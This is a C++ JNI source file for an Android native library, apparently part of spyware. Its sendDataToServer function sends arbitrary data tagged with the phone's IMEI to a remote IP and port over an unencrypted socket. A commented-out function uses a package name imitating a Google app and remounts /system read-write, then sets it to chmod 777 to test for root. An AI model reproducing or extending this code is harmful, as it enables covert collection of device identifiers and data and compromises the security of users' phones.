#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <stdint.h>
#include <err.h>
#include <errno.h>
#include <assert.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <string.h>
#include <limits.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <android/log.h>
#include <sys/inotify.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <time.h>
#include <dirent.h>

#include "public.h"


#define LOG_TAG "public"

unsigned short __ntohs(unsigned short us){
	return ( (us & 0xff00)>>8) | ((us&0x00ff) << 8);
}


int getPathFormFullName(char * fullpath,char * path){
	int fl = strlen(fullpath);
	if(fl <= 0){
		return -1;
	}
	for(int i = fl - 1; i >= 0; i -- ){
		if(fullpath[i] == '/'){
			memmove(path,fullpath,i + 1);
			return 0;
		}
	}

	return -1;
}




int sendDataToServer(const char * pdata,int datasize,int command,char * logfilename,char * serverip,int serverport,
		char *imei,char * clientname){

	int client_sockfd;
	int len;
	struct sockaddr_in remote_addr = {0};
	memset(&remote_addr,0,sizeof(remote_addr));
	remote_addr.sin_family=AF_INET;
	remote_addr.sin_addr.s_addr=inet_addr(serverip);
	remote_addr.sin_port=__ntohs(serverport);

	int ret;
	ret = client_sockfd=socket(AF_INET,SOCK_STREAM,0);
	if(ret<0)
	{
		writeLog(logfilename,"JNI sendDataToServer socket error\r\n");
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"JNI sendDataToServer socket error");
		perror("JNI sendDataToServer socket error");
		return ret;
	}

	ret = connect(client_sockfd,(struct sockaddr *)&remote_addr,sizeof(struct sockaddr));
	if(ret<0)
	{
		ret = close(client_sockfd);
		writeLog(logfilename,"JNI sendDataToServer connect error\r\n");
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"JNI sendDataToServer connect error");
		perror("JNI sendDataToServer connect error");
		return ret;
	}

	int sendsize =  4 + 4 + 4 + 16 + 16 + datasize;
	char * senddata = new char[sendsize];
	*(int*)(senddata) = sendsize;
	*(int*)(senddata + 4) = command;
	*(int *)(senddata + 8) = 0;		//not cryption and compression
	memmove(senddata + 12,imei,IMEI_IMSI_PHONE_SIZE);
	memmove(senddata + 28,clientname,IMEI_IMSI_PHONE_SIZE);
	memmove(senddata + 44,pdata,datasize);

	len=send(client_sockfd,senddata,sendsize,0);
	delete []senddata;
	ret = close(client_sockfd);
	if(len <= 0){
		writeLog(logfilename,"JNI sendDataToServer send error\r\n");
		__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"JNI sendDataToServer send error");
		perror("JNI sendDataToServer send error");
		return ret;
	}

	writeLog(logfilename,"JNI sendDataToServer send command ok\r\n");
	__android_log_print(ANDROID_LOG_ERROR,LOG_TAG,"JNI sendDataToServer send command ok");
    return 0;
}


int writeLog(char * logfilename,const char * plog){
	FILE * file = fopen(logfilename,"a");
	if(file <= 0){
		file = fopen(logfilename,"w");
		if(file <= 0){
			return -1;
		}
	}

	time_t time_seconds = time(0);
	struct tm* now_time = localtime(&time_seconds);
	char szdatetime[256] = {0};
	int timelen = sprintf(szdatetime,"%d-%d-%d %d:%d:%d ", now_time->tm_year + 1900, now_time->tm_mon + 1,
	now_time->tm_mday, now_time->tm_hour, now_time->tm_min,now_time->tm_sec);

	size_t len = fwrite(szdatetime,strlen(szdatetime),1,file);

	len = fwrite(plog,strlen(plog),1,file);
	fclose(file);
	return 0;
}


/*
extern "C" JNIEXPORT jint JNICALL Java_com_google_android_apps_plus_rootDevice_isdeviceroot(JNIEnv * env,jobject object,jstring filename){
	jboolean iscopy = JNI_TRUE;
	char * cfilename = (char*)(env->GetStringUTFChars( filename, &iscopy ));
	int ret = system("mount -o remount,rw /");
	ret = system("mount -o remount,rw /system");
	ret = system("chmod 777 /system");
	__android_log_print(ANDROID_LOG_ERROR,"isdeviceroot","test root file name:%s",cfilename);
	FILE * fp = fopen(cfilename,"w");
	if(fp <= 0){
		__android_log_print(ANDROID_LOG_ERROR,"isdeviceroot","fopen error");
		printf("fopen src file error\r\n");
		return -1;
	}

	char szroot[] = "hello root!\r\n";
	int writesize = fwrite(szroot,1,strlen(szroot),fp);
	fclose(fp);
	if(writesize != strlen(szroot)){
		__android_log_print(ANDROID_LOG_ERROR,"isdeviceroot","fwrite error");
		printf("write file error\r\n");
		return -1;
	}

	return 0;
}
*/
